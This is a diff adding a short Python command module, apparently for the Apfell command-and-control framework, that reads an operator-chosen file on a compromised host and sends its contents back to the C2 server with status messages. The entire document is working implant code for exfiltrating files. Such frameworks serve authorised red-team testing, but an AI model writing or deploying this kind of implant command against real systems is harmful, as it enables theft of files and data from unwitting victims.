@@ -1,0 +1,16 @@
+def download(apfell, c2, params="", task_id=-1):
+    try:
+        file = open(params, 'rb')
+    except Exception as e:
+        c2.post_response(response="Failed to open file: {}".format(str(e)), task_id=task_id)
+        apfell.remove_job(task_id)
+        return
+    try:
+        data = file.read()
+        c2.download(task_id=task_id, data=data)
+        c2.post_response(response="Finished download", task_id=task_id)
+    except Exception as e:
+        c2.post_response(response="Failed to send file: {}".format(str(e)), task_id=task_id)
+    apfell.remove_job(task_id)
+    return
+COMMAND_ENDS_HERE
